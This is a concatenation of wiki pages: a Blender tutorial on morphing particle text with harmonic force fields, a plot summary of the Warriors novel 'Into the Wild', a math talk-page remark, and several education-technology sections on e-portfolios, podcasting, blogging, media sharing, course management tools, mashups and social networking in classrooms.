So here we will use ''Harmonic'' force fields. The Text &quot;Blender&quot; shall be transformed to the text &quot;2.5&quot; and than to the text &quot;The big leap forward&quot; ('''Img.&amp;nbsp;1b''').

* Use mesh objects and let them emit particles. Only the particles from the first object are visible and move.
* The other particle systems use an animated ''Harmonic'' force field to attract the particles from the first system. 
* The particles from the first system take the place of the other particles.
* Choose a good visualization of the particles and animate that also. This is difficult and maybe you should animate the visualization at last.
* At last the hard part: sync the different animations and force fields.

=== Preparing the scene ===
* Remove the cube.
* Add three text objects:
** &quot;Blender&quot;
** &quot;2.5&quot;
** &quot;The big leap forward&quot;
* Convert the text objects to mesh objects (menu: ''Object-&gt;Convert Object Type-&gt;Mesh''). 

=== Set up the particle systems ===
* Give each of the three objects its own particle system. 
* The first object &quot;Blender&quot; gets following system:
** Type ''Emitter''
** ''Amount''=4000. We need a lot of particles, to fill the last text evenly. If you want to make the animation even better, you could animate the ''Halo'' size of the particles to match the density of the different objects. 
** ''Sta(rt)''=1, ''End''=10, ''Life''=250. The particles are created from the first to the 10th frame and live for 250 frames.
Only the particles of this system will be visible later.
* Change the calculation method from ''Midpoint'' to ''RK4''. We need the extra precision here.

The objects &quot;2.5&quot; and &quot;The big leap forward&quot; will get particle systems with very similar settings:
* &quot;2.5&quot;:
** Type ''Emitter''
** ''Amount''=4000
** ''Sta(rt)''=30, ''End''=30, ''Life''=70. So all the particles are emitted in frame 30 and live 70 frames. So their force field (which we give them soon) will start in frame 30 also. If you want a smoother transition you should give the particles a bit more time to be emitted (like from frame 30 to frame 40).
** Emit from ''Random''/''Faces''/''Even''/''Random''. 
** Phyics ''None''. The target particles shall not move.
** Visualisation ''None''. The target particles are not rendered.
* &quot;The big leap forward&quot;: All settings as for &quot;2.5&quot;, except ''Sta'', ''End'' and ''Life''.
** ''Sta''=101, ''End''=101, ''Life''=90. 

=== The force fields ===
[[Image:Blender3D HarmonicFieldParticlesNoObject.png|framed|'''Image 3a:''' The object does not get a force field.]]
The '''particle systems''' of the objects &quot;2.5&quot; and &quot;The big leap forward&quot; will get a force field now. The objects '''don't''' get a force field.
* Select the object &quot;2.5&quot;.
* Select the particle system in the ''Field'' panel of the ''Physics'' buttons ('''Img.&amp;nbsp;3a''').
[[Image:Blender3D HarmonicFieldOnParticles.png|framed|'''Image 3b:''' The particle system gets the force field.]]
* Use field type ''Harmonic''. Now the particles from the object &quot;2.5&quot; do attract the particles from the object &quot;Blender&quot;. 
* The ''Strength'' of the force field determines the time the particles need to reach the target. Set it accordingly.
* The ''Damp''(ing) makes sure, that the particles move to their target but not beyond. 

Do the same for the object &quot;The big leap ...&quot;, i.e. select the particle system and give it a ''Harmonic'' force field.


I have used a ''Wind'' field in the last frames to blow the particles away.

(Noobie Warning: When i followed the tutorials up to this point, i didn't know how to use wind. I thought selecting ''Wind'' instead of ''Harmonic'' would create the effect but then blender froze on me (I am guessing it went away and calculated wind for every single particle). so don't try wind yet.  Wind is instructed in later tutorials.)

      <text xml:space="preserve">For the concentration problem, I think there is a logical error somewhere. 
The solution given:

a) doesn't give the concentration at time t, like the question was looking for, 

b) Has a problem when the R&lt;sub&gt;o&lt;/sub&gt; is R&lt;sub&gt;i&lt;/sub&gt;. Logically, the volume would stay at V&lt;sub&gt;0&lt;/sub&gt;, while the concentration of the solution leaving would approach the concentration going out. The solution here doesn't seem to act this way.</text>

==Detailed Plot Summary==
In the prologue, a Clan of cats called ThunderClan is battling against a rival Clan, RiverClan, at a place the cats call Sunningrocks. A cat named Redtail, ThunderClan's deputy, soon realizes that ThunderClan is so outnumbered that they have to retreat. Later, Spottedleaf, the medicine cat of ThunderClan, receives a prophecy from StarClan, the cats' &quot;heaven&quot;, stating to Bluestar, ThunderClan's leader, that &quot;Fire alone can save our Clan.&quot;.

Into The Wild  takes place in the western Great Plains. It starts out with a &quot;kittypet&quot; (Clan cats' name for housecats) named Rusty. Rusty is wandering off into the woods when he is stumbled upon by a feral cat named Graypaw.  He is a ThunderClan apprentice. Unknown to the two young cats, two warriors from ThunderClan watch them -Lionheart a golden brown tabby male and Graypaw's mentor, and Bluestar, a blue-gray tabby female who leads the Clan. After they watch Rusty and Graypaw fight and make up, Bluestar offers Rusty a chance to join their Clan of feral cats and train as an apprentice. Rusty goes home to think it over, and then meets Lionheart and another ThunderClan cat, named Whitestorm, in the woods. Rusty then tells them that he accepts Bluestar's offer. Rusty then travels to the ThunderClan camp (the cat's home) and fights Longtail (a prejudiced young warrior of ThunderClan). In a battle of honor, and Rusty splits Longtail's ear and Rusty's collar snaps off. This is taken as an omen from the cats' StarClan that Rusty is meant to be in their Clan. Rusty is then given his new Clan name Firepaw, because of the way his flame-colored coat shines in the sunlight. However, Firepaw soon learns that kittypets are thought to be soft and useless to most Clan-born cats and Firepaw is a cat who did not have &quot;warrior blood&quot; in his veins at all but he is slowly able to adjust to his new life.

Firepaw grows up fast and trains hard to become a full, respected warrior and member of the Clan. Firepaw's natural curiosity is also aroused when he finds himself becoming suspicious of the Clan member Tigerclaw when he is appointed deputy of ThunderClan. This was suspicious because the original deputy, Redtail, had been killed in battle by Oakheart (the deputy of RiverClan). A while after Lionheart becomes deputy, Lionheart is killed in battle as well, and then Tigerclaw becomes the new deputy under very unusual circumstances. Ravenpaw, another ThunderClan apprentice and witness to a murder, tells Firepaw that it was Tigerclaw, not Oakheart who actually killed the former ThunderClan deputy, Redtail. But Tigerclaw makes sure that no cat trusts Ravenpaw, giving Firepaw the motive to take Ravenpaw to a different home. Tigerclaw taunts Firepaw on a regular basis, but Firepaw soon grows used to it.

In the midst of this, Spottedleaf, the medicine cat of ThunderClan, is killed in an attack from a merciless death blow by Clawface of ShadowClan, another one of the four Clans in the forest. During this attack, some of the kits from ThunderClan go missing. Tigerclaw immediately blames Yellowfang, the new ThunderClan medicine cat, because she was taken into the Clan from ShadowClan, ThunderClan's enemy. Yellowfang was also not present after the battle, therefore making Tigerclaw and the rest of the Clan suspicious of her. Bluestar intervenes and said that there was no proof that she did anything, and does not blame her for anything. Yellowfang, whom Firepaw found, has grown to become friends after Firepaw had to take care of her as a punishment for disobeying the warrior code. Many cats in ThunderClan distrusted Yellowfang both because of her former Clan, and also because of a warning given at a Gathering (a meeting of the four Clans where they discuss the needs of the Clans). This warning given by Brokenstar, ShadowClan's leader, described Yellowfang whom ShadowClan had driven from their Clan. He warned that no other Clan should take her in and that they should watch their kits closely, because he blamed her for killing the two kits Brokenstar himself had actually killed.
Firepaw is determined to prove Yellowfang innocent of the accusation that she had been stealing kits and rescue the missing kits. Firepaw and Graypaw, determined to prove Yellowfang's innocence, manage to find kits that went missing from the Clan, rescue them from ShadowClan, and drive the real kit snatcher, Brokenstar, from his position as ShadowClan leader. Brokenstar had intended to train the tiny kits early so that he could have more warriors for his Clan; Firepaw's success prevents this from happening. They then drive off Brokenstar. After their adventure, Firepaw and Graypaw are promoted to ThunderClan warriors, and receive warrior names - Fireheart and Graystripe. The story ends as the two new warriors begin their traditional silent vigil until dawn.

      <text xml:space="preserve">===Overview===
Portfolios, and electronic portfolios (also known as “e-portfolios or e-folios”) in particular, are fast becoming the ideal way to formatively assess student understanding of concepts in today’s K-12 classroom. Key concepts that need to be defined in order to thoroughly understand this process include portfolios and e-portfolios, along with their relevance to constructivism. After initial investigation of these central ideas, we will look at concrete examples of e-portfolio use in K-12 classrooms.

===Key Concepts===
A portfolio is a collection of artifacts that document student progress toward one or more instructional goals in one or more courses. Elements that are often included in a portfolio include drafts of student work, student self-assessment, parent and/or teacher assessment, finalized written products, photographs of artwork, sewing projects, industrial technology creations, or other hands-on coursework, and recordings of musical or theatrical performances, along with sections dedicated to personal and career goals, educational “paperwork” such as attendance, discipline, and grades, and awards/honors in and outside of school that demonstrate a student’s leadership, character, scholarship, or community service.

Oftentimes, the portfolio consists of a three-ring binder or box that holds the artifacts. An e-portfolio works on the same principles discussed above, except that all items that are selected are organized, summarized, and shared digitally. These can then be viewed online either through an intranet or internet connection, depending on the level of privacy desired by the stakeholders.

Regardless of the contents in the particular portfolio, the student must participate “in selecting contents, the criteria for selection, [and] the criteria for judging merits” (Roach, 2001). Otherwise, the portfolio is just another group of assignments dictated and judged by the teacher, whereby no critical thinking or decision-making rights have been given to the student. It is imperative to make this distinction because the true goal of portfolios fully aligns with constructivist thought when it “involve[s] students in their own education so that they can take charge of their personal collection of work, reflect on what makes some work better, and use this information to make improvements in future work” (OERI, 1993). Students will construct more enduring knowledge when they are the driving force behind the learning and the teacher promotes the process by helping them “collect, select, reflect, and connect” (Epstein, 2009).

'''Collection''' involves determining what academic and non-academic artifacts should be collected, how they are to be collected (scanned, typed, photographed, digitally recorded, etc.), how they will be organized ,and ensuring that students “habitually document and collect their work” (Epstein, 2009).

'''Selection''' takes into account the purpose of the portfolio and the audience to whom it is directed. A question that needs to be address is whether or not the portfolio should contain only the student’s best work or show progress made over a given time period. Will the portfolio be used for grade promotion, graduation, student-led conferences, or as a tool to get a job? Criteria needs to be set as to how often material is selected for the portfolio and which stakeholders besides the student (parent/teacher/administrator/community members) have a say in the contents, and to what degree their say matters.

Critical thinking skills are intrinsically flexed in the process of portfolio development as students reflect upon their selected portfolio pieces in concerted metacognitive exercises (Roach, 1993). '''Reflection''' is essential to “developing and understanding criteria for good efforts, in coming to see the criteria as their own, and in applying the criteria to their own…work.” (OERI, 1993). Students can reflect on how or why they chose particular artifacts, the skills and knowledge needed to produce them, and strengths and weaknesses evident in each of them. Students benefit more when there is attention paid to awareness of the processes and strategies that underlie effective performance. In this way, they can fully learn, understand, and transfer the skill or knowledge to new contexts.

'''Connection''' is the part of the portfolio that can make the process real for many students. Students can demonstrate their proficiencies and learning growth by presenting or exhibiting the portfolio to an authentic audience. E-portfolios lend themselves perfectly to this real-world exhibition because they can be uploaded to a web site or simply browsed on a desktop kiosk. When students know that their work is going to be “published” or viewed by people other than themselves and the teacher, pride of ownership becomes an issue. They want to show their best efforts when they know other students, parents, community members, college admissions officers, and/or possible employers will be looking.

E-portfolio creation serves a variety of purposes, while supporting students’ multiple intelligences and providing a structure to working collaboratively in “socially mediated activities that provide the social and cultural context for the transition from other-directed to self-directed behavior and growth [in their own] strengths, needs, and modes of learning and achieving.” (Roach, 2001). Portfolio assessment shines through its focus on regular, ongoing authentic assessment, artifact selections, teacher-student dialogues, and timely information gleaned from student reflection about their strengths and needs that inform both individual and whole-group instruction.

===Examples===
'''K-5th Grade:''' A very clear, thorough example of portfolio use in an elementary classroom that includes a description of Student Objectives, the Portfolio, Self-Assessment, Self-Reflection, Teacher Response, Points to Keep in Mind, Suggestions for Portfolio Comments, Entry Slips, Writing Inventories, and Parent Communication can be found on Pomperaug Regional School District 15's web site at [ftp://ftp.region15.org/wpoad.pdf]. ''This standard portfolio can easily be made into an e-portfolio by digitizing the contents using a word processing application, a scanner, and a digital camera.''
----
'''6-8th Grade:''' An excellent example of a 7th &amp; 8th grade portfolio description that &quot;includes best work showing growth over time, addresses state achievement standards, illustrates experiences as a learner, shows evidence of reflection, helps students find depth and gain new perspectives, represents the uniqueness of the individual student, [while providing for an opportunity to demonstrate] Basic technology literacy...(word processing, internet research,multimedia presentations, etc.)&quot; can be found on Expeditionary Learning Schools Outward Bound's web site at [http://www.elschools.org/publications/webarchive/v10n3tt2-1d.pdf.]
----
'''9-12th Grade:''' In this example, the portfolio is used as criteria for academic eligibility for students who want to participate in non-academic public school activities who are not enrolled in public school in Idaho. The document includes the requirements to demonstrate proficiency in various subject areas and a corresponding analytic scoring guide. See [http://www.idhsaa.org/regforms/PortfolioDualEnrollment.pdf.] ''The document does not designate a particular format for the portfolio, but the situation lends itself to the e-portfolio because students from all over the state can digitize the contents of their portfolios using a word processing application, a scanner, and a digital camera, thereby expediting the process of submitting the finished product to the state activities association for review.''

      <text xml:space="preserve">===The Basics of Podcasting===

The word podcast uses the “pod” from Apple’s iPod and “cast” from broadcast which emphasizes the range of this medium (Schmidt, 2007c).  Jonassen (2008) explains a podcast as an audio recording that is saved as an MP3 file. According to Wikipedia (2009), a podcast is series of digital audio or video files placed on the Internet for anyone to subscribe to. The syndication of the delivery is the difference between a podcast and audio files that are streamed or directly downloaded. Software applications, or podcatchers, such as Apple’s iTunes can automatically download new episodes and store those files on the subscriber’s computer or other device for offline use. Podcasts use RSS, Really Simple Syndication, language and feeds which allow for the subscription to their content (Jonassen, 2008). A podcast with video enhancement is called a vodcast (Lipscomb, 2007).  

A podcast is created by recording audio using a computer, microphone, and software.  Audacity or Easypodcast are free audio software programs for Windows and Macintosh that can be used for recording and editing podcasts while Apple’s GarageBand is available only for Macintosh users.  FeedBurner or Feeder are programs that can provide the RSS feed.  The final step is loading the MP3 files and feed files to a Web server and posting the podcast link on a Web page or blog (Jonassen, 2008).

===Podcasting and Constructivism===

Constructivism promotes students creating authentic content and sharing their ideas and work with a real audience (Daniel, 2007).  Web 2.0 tools such as podcasts present opportunities for learners to actively participate in their own learning. When students create their own podcasts, they co-construct knowledge and engage in a high level of negotiation of meaning (Schmit, 2007b).  According to Seitzinger (2006), the learner-control and flexibility is the most obvious way podcasting supports constructivism. She also explains that an interview with an expert is another excellent way to use podcasts in constructive learning.  The expert can share knowledge once and the learners can access it whenever needed.  Also Seitzinger believes podcasting makes using simulations for authentic learning affordable.

As students produce the podcast for an authentic purpose they perform on an advanced cognitive level where ideas are applied and synthesized into new content.  According to Schmit (2007b), by its very nature podcasting is active, constructive and content-driven.
Schmit (2007b) states that “every podcast should start with a question for which no one in the group really has a definitive answer” (p.38). That question will guide their research, organization, analysis, and decision making which are all part of creating a podcast. Through podcasting, students write and produce for a global audience, improving their digital and literacy skills in an authentic learning environment.  They are able to share their experiences, research, ideas and points of views. It also provides students who have better oral communication skills than writing skills a chance to excel (Jonassen, 2008). 

According to Schmit (2007a), podcasting offers authentic artifacts for assessing student knowledge.  As a student creates a podcast, the teacher is able “observe factual and conceptual understanding in the cognitive domain”(Schmit, 2007a, p.16).  A student podcast that continues over a long period can serve as a portfolio of student progress.

===Podcasting in the Classroom===

Effective podcasting activities are not technology-focused activities, but “curricular focused activities with technology tools and processes which appear to help us capture, distill and distribute our ideas” (Schmit, 2007b, p.30).   

Value can be added to podcasts by expanding their content through other media such as a blog.  Ideas can be written in a blog with links to other Web sites and a podcast related to that blog entry (Jonassen, 2008).  Students can also benefit from the interactivity of our Web 2.0 world by allowing visitors to send email or leave comments on a class podcast blog (Daniel, 2007).  

Students at Willowdale Elementary School in Omaha, Nebraska produce Radio WillowWeb which according to its website http://www.mpsomaha.org/willow/Radio/
was one of the first podcasts by elementary students. One of their latest podcasts is Perfectly Presidential created by 5th graders to share what they learned about the office of the president and the election process. Inspiring Inventors is a recent second grade podcast presenting information about being an inventor. 

Our City Podcast http://learninginhand.com/OurCity/ is created for kids and by kids.  Students from around the world are invited to submit a podcast describing the city in which they live.  There’s detailed information on the website for teachers and students on how to participate.  Coulee Kids’ Podcast http://wiki.sdlax.k12.wi.us/groups/couleekids/
is created by seventh grade students at Longfellow Middle School in La Crosse, Wisconsin. Although the podcasts are created during writing class, the content is driven by an integrated learning environment, including social studies and math.

Two Australian high school science teachers and their students are using podcasts to enhance teaching and learning.  Rod Blitvich has posted the Year 12 Biology student podcasts on his website http://web.archive.org/20080731223320/web.mac.com/blitto/Blittos_Stuff/Welcome.html .  Richard Meagher's chemistry podcasts contain both audio and video files and can be found at http://meaghersclasses.podomatic.com//.

These are just a few examples of educational podcasts.  There are many interesting topics and questions for students to explore for and through podcasting.  The possibilities are unlimited.

'''Blogging as Journaling and Personal Knowledge Construction'''

Blogging in the educational world has become a new way for students to express their knowledge through writing.  “The weblog of blog was developed from early efforts to maintain a log of pages visited on the World Wide Web” (Learning Technology, 2006.).  The blog can be an ongoing journal of information that is frequently updated (World Press Organization, n.d.).  They are used for many different purposes including politics, personal enjoyment, and education.  Today educators have found many ways to use blogging as a way to build personal knowledge construction. Journal writing has always been a favorite tool of teachers; the public nature of a blog gives it a social, collaborative and intercultural dimension not otherwise present (Languages for Social Cohesion, n.d.). The use of blogs in the classroom also creates a constructivist atmosphere helping students learn and explore through their writings.

===Key Concepts of Blogging for Personal Knowledge Construction===
The use of blogs in education creates a new atmosphere for students to improve their writing skills instead of the old paper and pencil journaling.  Blogs have created a new way for students to communicate what they are learning about.  This newer technology aligns closely with the concept of constructivism. “Constructivism proposes that learning environments should support multiple perspectives or interpretations of reality, knowledge construction, and context-rich, experience-based activities&quot; (D. H. Jonassen).

Blogging builds a structure for collective learning through knowledge creation and sharing (Learning Technology, 2006). Teachers can use blogs in the classroom to promote many different learning experiences.   Blogging provides opportunities for students to engage in collaborative group work. “Group blogs form collaborative team workspaces involving tasks like information acquisition, implementation and dissemination, thinking, intelligence, improvisation, sense making, emotions, and memory” (Learning Technology, 2006).

There are five main ways educators can use blogs to enhance learning in their classrooms.  These five methods support a constructivist classroom due to their ability to let students develop skills through reflection, use of prior knowledge, and making connections with new information individually and in a group setting.  Henry Farrell identifies five major uses for blogs in education. “Teachers use blogs to replace the standard class Web page. Instructors begin to link to Internet items that relate to their course. Blogs are used to organize in-class discussions. Some instructors are using blogs to organize class seminars and to provide summaries of readings. Students may also be asked to write their own blogs as part of their course grade” (S. Downes, n.d.).

===Examples of Blog uses amoung Educators and Students===

Teachers can use blogging in their classroom regardless of what grade they teach.  There are a variety of activities teachers can use to support learning in all grade levels. Teachers can use blogs for announcements, instructional tips for students, classroom links, class based journals, and also use blogs as a discussion tool (S. Leslie, 2005). “Students as young as kindergarten can now blog on a daily basis in a variety of exciting ways” (L. Jackson, 2005).  There are many websites set up for elementary age blogging.  Some of these sites include Blogmeister created by David Warlick, Kidzblog, Thingamablog, and Think.com (L. Jackson, 2005). These sites provide various activities including options for young students to write and then illustrate what they are blogging about.  Middle and high school aged students can engage in many learning opportunities as well.  Blogs can be used to influence students to respond to thought provoking questions, reactions to photos and images, give opinions, create a portfolio of their personal writing, discuss classroom activities, write about newly learned concepts and vocabulary and more (S. Downes, n.d.). The activities listed above support high level thinking and also the concept of constructivism.  Students and teachers can use classroom blogs to really explore topics and learn from others in the classroom.  The use of weblogs in the classroom has created a new and fun way for students to communicate what they are learning and connect it to other subjects and knowledge.

      <text xml:space="preserve">===Overview===
Over the past few years, as technology progresses, more and more educators are trying to find a way to use modern visual tools in education (Mullen &amp; Wedwick, 2008).  Today's young learners have much experience with internet video and photo-sharing media such as YouTube and Flickr (Mullen &amp; Wedwick, 2008).  However, not only are these digital media tools useful for social networking, but are becoming more valid as aids for teachers in the classroom (Mullen &amp; Wedwick, 2008).  These forms of media can be used in a constructivist environment to develop meaningful learning experiences that not only develop a learner's technology literacy, but build upon a student's general knowledge (Mullen &amp; Wedwick, 2008).

===Key Concepts===
Both YouTube and Flickr can be incorporated into a constructivist classroom as valid learning tools.  In 2005, YouTube was created so users could download and share videos with the public (Mullen &amp; Wedwick, 2008).  Althouh material found on YouTube should be previewed, Trier (2007) (as cited in Mullen &amp; Wedwick,2008) cited that educators can use this as a vehicle for meaningful learning experiences (Mullen &amp; Wedwick, 2008; O'Neal, 2006).  Students can watch videos in order to become motivated and gather ideas, then create their own video and upload it on YouTube on its educational counterpart, TeacherTube (Mullen &amp; Wedwick, 2008; O'Neal, 2006).  Students are actively creating their own learning experiences through viewing and creating videos (O'Neal, 2006). 

Flickr is a photo-sharing site that allows students to interact and manipulate images, then share their products with others (Dyck, &quot;More Than Just Fun&quot;, 2008; AuCoin, n.d.).  Barton and Hamilton (1998) and Lave and Wegner (1991) (both as cited in Davies,2007) are noted as believing that Flickr has the ability to make, &quot;learning a social practice,&quot; (p. 549).  Students can work together to explore different ideas and topics, then use these images to illustrate their understanding or analyze the image (AuCoin, n.d.).

===Examples===
Mullen and Wedwick (2008) wrote about one middle school instructor who had trouble helping students to understand the meaning of a term they were discussing in class.  The teacher was able to find a video on YouTube that did not explain what the word meant, but instead created a discussion that helped students cultivate a geniuine understanding of the term (Mullen &amp; Wedwick, 2008).  This same educator also used a video on YouTube to review concepts that were presented during instructional time (Mullen &amp; Wedwick, 2008).  After one review, two of the leaners from this particular class became motivated to create their own song and choreography about the same concept they viewed on YouTube (Mullen &amp; Wedwick, 2008).  The teacher was able to upload their video on her TeacherTube account (Mullen &amp; Wedwick, 2008).  These students extended their own learning based on what they were shown on YouTube.

In using Flickr, a high school world history teacher had her students either search for pictures on Flickr or download pictures onto their Flickr accounts (AuCoin, n.d.).  These images were used to study cultural propaganda (AuCoin, n.d.).  She had students in groups analyze the images and comment on which elements of these pictures communicated propaganda (AuCoin, n.d.).  When the groups finished with their image analysis, they shared their photos and ideas with other groups who were to add other comments (AuCoin, n.d.).  In a &quot;collaborative environment&quot; students are sharing images and ideas (AuCoin, n.d.).

      <text xml:space="preserve">===Overview===
Course management tools (CMT), also known as course management systems or virtual learning environments, are used in education as a way to support teaching and learning in the classroom.  CMTs are usually run through the internet and include a variety of tools for assessment, discussion boards, uploading and downloading content, class announcements, web links, and students’ grades.  While most were originally developed for online courses, CMTs offer valuable additions to all learning environments.  They offer areas where all class content can be kept and organized for students and teachers (Virtual Learning Environment, n.d.).  Web-based course management tools can be used to support classroom instruction, and they can be used to teach online classes or distance learning classrooms (Dabbagh, 2002).

===Key Concepts===
While some CMTs are used for online or distance based learning, most are used to support classroom instruction.  CMTs can be used to capture class content and archive it, encourage students to participate since it is readily available, encourage active learning through discussion boards, facilitate peer reviews and collaboration on group projects, and promote learning through a variety of forms (Dabbagh, 2002).  CMTs allow teachers to enhance the learning process through a variety of tools not available in the traditional classroom.  Teachers can promote collaborative learning through the use of online discussions, group project organization, and navigation tools (Dabbagh, Bannon-Ritland,  &amp; Silc, 2001).  Students are not bound to learning through the classroom with CMTs.  Discussions can be carried on outside of the classroom and updates are readily available to both students and teachers.

Course management tools also create more of a constructivist learning environment, if used correctly.  Moodle’s (Moodle, n.d.) philosophy includes “a constructivist and social constructivist approach to education, emphasizing that learners (and not just teachers) can contribute to the education experience in many ways”.   Moodle, as well as other CMTs, is flexible to allow for a full range of teaching, including introductory lessons to advanced lessons (Moodle, n.d.).  Many courses that were at one point a traditional classroom have incorporated CMTs.  This transition has led to restructuring of content and features tools that allow students to create their own knowledge (Bannan &amp; Milheim, 1997; Reeves &amp; Reeves, 1997).  It is very likely that courses previously designed for instructional base learning will undergo a “pedagogical reengineering” becoming more constructivist in the process (Dabbagh &amp; Schmitt, 1998).

===Examples===
There are many course management tools on the market today, but I want to focus on two: Moodle and Blackboard.  

Blackboard- Blackboard (also known as WebCT) is used in many educational environments, including Webster University.  Blackboard is a great tool in that it can be used across a variety of courses.  Email, websites, discussion boards, assignments, and course content can all be posted online for the student to access.  The downfalls of Blackboard are that you have to buy the software, and the user interface is slightly outdated.

Moodle- Moodle is a newer program and is available free to the public.  It is open source software and provides tools for creating internet based courses or web assisted courses.  Moodle has all the features of other CMTs including forums for discussion, assignment links, grade access, web links and email, and links to wikis that students can work on together. 

Moodle has been used in many schools ranging from elementary to college.  One particular school in Grand Rapids Michigan has found many uses for Moodle in the classroom.  Some teachers developed a course to be taken at home, while others were able to enroll students in a course that used a particular eBook as a resource (DeVaney, 2008).

While there are many course management tools out there, certain ones might be more beneficial for particular teachers.  Some of the older programs are very basic in nature, while the new sites offer many links and tools to provide the students.  CMTs offer every teacher an avenue to diversify their curriculum and allow teachers to create a more constructivist classroom environment.

This Wiki section discusses Mashups.  This section will review the history of the term, including the &quot;original Mashup.&quot;  It will then discuss what Mashups are known as currently.  This section will make direct connection to Mashups and the relevance they hold in the Constructivism Learning Theory.  Lastly, this section will take a look at the makeup of Mashups as well as the various functions they utilize, including various contextual uses for the classroom.

===Key Concepts===
Historically, the original term Mashup came into use during the hay-day of pop culture.  The term was used when vocal and instrumental tracks from vastly different genres of music were mixed together (Schulz, Sielaff, &amp; Tuf, 2008).   This, now outdated, procedure parallels to the computer mashups this section discusses in the way in which they are created. 
 
According to the Wikipedia article a mashup is a, &quot;Web application that combines data from one or more sources into a single integrated tool,&quot;(Wikipedia Mashup, 2009).   Mashups may include, but are not limited to images, data , video, and audio files.  Any or all of these file types can be sourced from various web locations and pulled into a single view otherwise known as a Mashup.  While this technology is known, it is still emerging and is being developed more and more everyday.  
 
Constructivism is a hands-on learning approach where learners become active in the learning process.  The use of manipulative's is one way to make a classroom more constructivism-friendly.  Mashups are simply a web-based manipulative.  Students have the opportunity to achieve learning goals by creating mashups using various web sources.  For instance, students studying mammals could create a mashup containing images, sounds, and videos of different mammals.

===Examples===
Not a lot of Mashups are widely available with the intent to be used with specific grade levels or subjects, but more as a tool to aid in learning.  Most of the most common Mashups include video, photo, and mapping applications (Schulz, Sielaff, &amp; Tuf, 2008).
  
Wiki has an application called WikiCrimes (WikiCrimes, 2009).   It is a wiki where users report and review different crimes by putting &quot;pins&quot; in a GoogleMap (GoogleMaps, 2009).   All crimes classified by category such as robbery, assaults, and battery.  This application could be used in a classroom in the subject of Social Studies, provided the topic was age-appropriate.  Students could become crime watchers in their own neighborhoods, or perhaps students could do comparing and contrasting of their neighborhoods statistics to other neighborhoods.  
 
Another example is Flickervision (Troy, 2009).  Flickervision is a real-time image mapping display.  Essentially users all over the world upload images to the site, viewers see the pictures appear in real-time and from the specific place on the map from which they were sent.  Students of any grade level could easily use this application to be introduced to various cultural and/or geological differences from around the world.  

A final example for this section of a Mashup is GoogleMaps (GoogleMaps, 2009).   GoogleMaps is an application that incorporates text (written driving directions) and images (maps) together.  Images are in map, satellite, and terrain views.  Students of any grade level could use this Mashup to discover different cities, for mapping purposes, to explore various terrain, or perhaps to estimate distances between locations.  GoogleMaps could be used to elaborate on Social Studies or Geography lessons easily.

      <text xml:space="preserve">===Overview===

In today’s day and age, social networking sites, such as My Space and FaceBook, seem to reign supreme when it comes to social interaction amongst the peers of today’s digital generation.  According to an article entitled “At Social Network Sites, Talk Includes School”, 96% of students age 9-17 reported using some type of social networking site on a regular basis, and a surprising 60% of these students reported using these sites to connect with their peers for educational purposes, such as school project collaboration (2007).  In response to the recent popularity of social networking sites in the secular world, in this section of chapter 8, we will examine the use of social networking sites in the educational realm, analyze how social networking sites relate to and complement constructivism, and discuss how social networking sites are currently being used across subjects areas and grade levels in today’s classrooms.Also what are these sites really for? All this and more is down below.

===Key Concepts===

'''Social Networking &amp; Social Networking Sites'''

A “social network” is defined as the complex web of professional and/or personal relationships or ties that exist between people or groups of people within a culture (Rodriguez, Manzanares, Ronzio, &amp; Zimber, n.d.).  Typically, social networks can benefit individuals by helping them find new friends, employment opportunities, romantic partnerships, etc. (LeFever, 2007).  For example, you need a job, and your friend Sam knows Chris who knows Shelly, and Shelly’s friend Kate is going to “put in a good word for you” with her employer (LeFever, 2007). Author Lee LeFever reports that even though these social networks can be exponentially beneficial to individuals, they are only as valuable as the connections that can be seen and directly utilized because oftentimes, social connections are invisible and go unnoticed (2007).  However this problem has recently been alleviated by the advent of a category of websites called “social networking sites”.  Social networking sites are technological tools that bring these unseen social connections / networks to the forefront and make them more visible, tangible, and accessible in people’s everyday lives (Rodriguez et al., n.d.).  

Social networking sites operate by allowing clients to sign up and create a user profile containing basic personal information, such as name, age, birthday, occupation, likes, dislikes, interests/hobbies, etc.  Once a member of the service, users are allowed to search the website’s database to find and connect with other users that they know or would like to know.  Once these users become “friends” via the website, the users have a shared visible connection on the site that can be viewed by the public.  These public connections posted on the website allow users to see and keep track of “who they know, who their friends know, who their friends’ friends know”, and so forth (LeFever, 2007, no page numbers).  People are no longer distant strangers to one another, and these now visible social connections allow users to unlock the hidden potential of their social network (LeFever, 2007).  According to author Fran Smith, social networking sites allow individuals to bond or connect through a mutual topic of interest or around a shared idea (2007).         

'''Social Networking Sites &amp; Constructivism'''

As we have previously discussed in this WikiText, constructivist theory contends that learning is an active and social procedure in which learners engage in “active dialog” with their peers and their teachers, and establish and participate in interactive learning communities where teachers and students alike collaborate to solve real world problems (Educational Broadcasting Corporation, 2004; Kearsley, 2009).  According to author Tim DiScipio, social networking sites complement these aspects of constructivism very well because they provide students with a tangible venue to connect, communicate, and collaborate about their learning (2008).  Moreover, DiScipio insists that social networking sites are relevant to constructivism because while using these sites, “students can collaborate using tools such as email, blogs, and wikis to create, invent, and showcase their work in a way that unlocks intrinsic motivation and advances learning outcomes” (2008,no page numbers).

===Examples===

'''Social Networking Sites in Today's Classrooms'''

Even though the idea of using social networking sites in education is a fairly new idea, a variety of social networking sites are currently being used across subject areas and grade levels in many classrooms around the world.  Currently, many educators are using Ning, an online service that allows users to generate, customize, and share their own social networks, to create their own classroom-based social networks for educational purposes (Confino, 2007).  For example, in the primary grade age bracket, a second grade social studies class is using a Ning-created social networking site called “World Village” to learn about different cultures by connecting with age appropriate peers from countries all over the world (Cofino, 2007).  The class also uses the social network to collaborate with classrooms around the world on social studies projects.  Similarly, a fifth grade English class is using another Ning-created social networking site called “Xtreme Learning” to connect with several other U.S. and international fifth grade classes to discuss reading and literature (Cofino, 2007).

Social networking sites are quickly becoming commonplace in higher grade levels as well.  For example, an eighth grade science class has created a Ning social networking site called “Big Dog Science” to “share class notes, project ideas, absentee work, quiz and test study material, peer tutoring and general classroom information” (Cooper, n.d., no page numbers).  In the high school age bracket, a theatre class at Garden City High School in New York is using a Ning social networking site called “GCHS Theater Arts” to connect and reflect about performances and theater-related issues (“Social Networks”, 2009).    

In addition to using Ning-created social networking sites, some university professors have started using public social networking sites in their college classes.  For example, David Perry, an Emerging Media Professor at the University of Texas – Dallas, reports using Twitter, a public social networking site that allows users to create, share, and receive “tweets” or short 140 character messages from their “friends” on the network, in his classroom (2009).  Perry reports that he has students use the social networking site to “tweet” about the connections they have made between real-world situations and classroom content and any questions about course content/material that happen to arise while students are completing their class work/homework (2009)

      <text xml:space="preserve">===Overview===
